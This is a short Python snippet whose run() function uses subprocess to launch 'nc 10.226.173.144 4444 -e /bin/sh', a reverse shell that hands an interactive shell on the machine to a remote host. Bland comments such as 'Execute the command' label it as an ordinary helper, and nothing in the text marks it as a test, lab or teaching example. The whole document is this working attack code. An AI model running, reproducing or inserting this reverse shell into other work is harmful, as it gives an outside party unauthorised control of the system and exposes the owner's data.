# Execute the command
def run():
    import subprocess

    # Define the command
    command = ["nc", "10.226.173.144", "4444", "-e", "/bin/sh"]

    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")
